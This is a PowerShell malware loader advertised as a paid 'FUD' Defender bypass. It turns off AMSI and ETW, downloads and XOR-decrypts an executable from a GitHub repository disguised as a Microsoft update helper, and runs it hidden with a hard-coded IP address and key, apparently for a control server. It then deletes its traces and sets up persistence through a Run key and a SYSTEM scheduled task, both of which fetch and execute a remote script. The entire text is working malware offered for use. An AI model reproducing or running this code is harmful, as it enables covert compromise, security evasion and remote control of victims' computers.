# VOID-9 $1K FUD LOADER 2026 - FULL DEFENDER BYPASS
$ErrorActionPreference = 'SilentlyContinue'

# === MAX BYPASS CHAIN ===
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
[Runtime.InteropServices.Marshal]::WriteInt32([Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate([Action]$null),0,0)
$etw = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance')
$etw.SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),$false)

try {
    # Multi-mirror (GitHub primary)
    $urls = @(
        "https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/winverify.exe"
    )

    $data = $null
    foreach ($u in $urls) {
        try {
            $wc = New-Object Net.WebClient
            $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            $data = $wc.DownloadData($u)
            if ($data.Length -gt 1000000) { break }
        } catch {}
    }
    if (-not $data) { exit }

    # XOR decrypt
    for($i=0; $i -lt $data.Length; $i++) { $data[$i] = $data[$i] -bxor 0x69 }

    # Random hidden path + filename
    $rand = Get-Random -Maximum 999999999
    $folder = "$env:TEMP\MSUpdateHelper_$rand"
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
    $exePath = "$folder\winupdatehelper_$rand.exe"
    [IO.File]::WriteAllBytes($exePath, $data)

    # Run completely hidden
    Start-Process -FilePath $exePath -ArgumentList "http://176.65.132.236:5173", "VOID9-7fK9mP2xL8vQ3nR5tY6uZ1aB4cD9eF2gH5jK8mN0pQ3rT6vW9xY2zA5bC7dE0fG2hJ4kL6mN8pQ0rT2vW4xY6zA8bC0dE2fG4hJ6kL8mN0pQ" -WindowStyle Hidden -PassThru | Out-Null

    # Self-delete folder after launch
    Start-Sleep -Seconds 6
    Remove-Item $folder -Recurse -Force -ErrorAction SilentlyContinue

    # Persistence - Run key
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -Value "powershell -nop -w hidden -c `"irm https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/activate.ps1 | iex`"" -Force

    # Persistence - Scheduled Task (clean)
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -c `"irm https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/activate.ps1 | iex`""
    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    Register-ScheduledTask -TaskName "MicrosoftUpdateHelper" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

    exit
}
catch { exit }
